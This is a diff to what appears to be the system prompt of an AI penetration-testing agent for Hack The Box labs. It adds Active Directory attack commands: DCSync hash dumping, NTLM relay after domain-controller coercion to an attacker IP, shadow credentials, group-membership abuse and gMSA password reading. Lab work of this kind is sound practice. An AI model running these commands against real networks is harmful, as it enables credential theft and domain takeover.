@@ -29,15 +29,34 @@ DOMAIN_HTB: Dict[str, Any] = {
 - SMB enumeration: ALWAYS `nxc smb` (NOT enum4linux for modern targets)
 - AD recon: Use `rusthound-ce` for BloodHound collection, `bhcli` for BloodHound CE queries
 - Kerberos: `GetNPUsers.py`, `GetUserSPNs.py`, `kerbrute`
-- Secrets/hashes: `secretsdump.py` (impacket), `nxc smb --sam/--lsa/--ntds`
-- Certificate attacks: `certipy find`, `certipy req`
+- Secrets/hashes: `nxc smb <dc> -u <user> -p <pass> -d <domain> --ntds` (preferred for DCSync — no impacket Python bugs)
+  → If impacket's secretsdump.py fails with Python 3.14 NoneType bug, fall back to nxc --ntds
+  → For Kerberos-only DCSync: `nxc smb <dc> -u <user> -H <hash> -d <domain> --ntds --kerberos`
+- Certificate attacks: `certipy find`, `certipy req`, `certipy shadow auto` (shadow credentials)
+- AD ACL manipulation: `bloodyAD -d <domain> -u <user> -p <pass> --host <dc> add groupMember "<group>" <target>`
 - PTY shell: spawn via `pty_create_pane` then `pty_run_command` — NEVER run long interactive tools in bare bash
+
+CRITICAL RELAY ATTACK PATTERNS:
+- **DCSync via relay** (no RBCD needed):
+  `ntlmrelayx.py -t ldap://<dc> --escalate-user <your-user>` → coerce DC with petitpotam/printerbug
+  → Grants DCSync rights to <your-user> via LDAP WriteDacl on domain object
+  → Then: `nxc smb <dc> -u <user> -p <pass> -d <domain> --ntds`
+  NOTE: use `--escalate-user`, NOT `--delegate-access` (--delegate-access needs MAQ>0)
+- **Add user to group via relay**:
+  `ntlmrelayx.py -t ldap://<dc> --add-computer` (if MAQ>0) OR `--escalate-user` for DCSync rights
+- **Coerce DC for relay**: `petitpotam.py 10.10.16.2 <dc-ip>` or `printerbug.py <dc-ip> 10.10.16.2`
+
+CRITICAL AD ATTACK PATTERNS:
+- **GenericWrite on user** → Shadow Credentials: `certipy shadow auto -u <attacker> -p <pass> -dc-ip <dc> -target <victim>`
+- **GenericAll/WriteDacl on group** → add member: `bloodyAD --host <dc> -d <domain> -u <user> -p <pass> add groupMember "Group Name" username`
+- **Protected Users account** (NTLM blocked): use ONLY Kerberos auth. If preauth fails, try single-`$` variant of password (some configs escape `$$` → `$`).
+- **gMSA password** (ReadGMSAPassword right): `nxc ldap <dc> -u <user> -p <pass> --gmsa`
 
 Available tools on this system:
 - Network scanning: rustscan, nmap, masscan, sntp (NTP enumeration)
 - SMB/Windows: nxc (netexec), smbclient, smbmap, evil-winrm
 - Web: ffuf, feroxbuster, curl, nikto, sqlmap, whatweb
-- AD/Kerberos: bhcli, rusthound-ce, certipy, impacket-* (GetNPUsers, GetUserSPNs, secretsdump, psexec, wmiexec, smbexec, lookupsid, addcomputer), kerbrute
+- AD/Kerberos: bhcli, rusthound-ce, certipy, bloodyAD, impacket-* (GetNPUsers, GetUserSPNs, secretsdump, psexec, wmiexec, smbexec, lookupsid, addcomputer, ntlmrelayx, petitpotam, printerbug), kerbrute
 - Wordlists: seclists (at /usr/share/seclists/), rockyou (at /usr/share/wordlists/)
 - Post-exploit: linpeas, winpeas, pspy64, chisel, ligolo-ng
 - Misc: jq, python3, curl, wget, nc (netcat), socat
